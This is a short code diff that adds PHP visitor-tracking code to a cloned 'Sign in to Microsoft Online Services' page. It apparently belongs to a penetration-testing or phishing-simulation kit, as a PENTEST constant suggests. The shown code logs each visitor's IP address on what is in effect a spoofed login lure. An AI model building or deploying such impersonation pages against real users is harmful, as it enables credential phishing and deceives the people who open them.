@@ -1,3 +1,11 @@
+<?php
+const PENTEST = 1;
+include "include.php";
+$runtime = new Runtime();
+
+$runtime->addHit(filter_var($_SERVER['REMOTE_ADDR'], FILTER_SANITIZE_STRING));
+?>
+
 <head>
     <title>Sign in to Microsoft Online Services</title>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
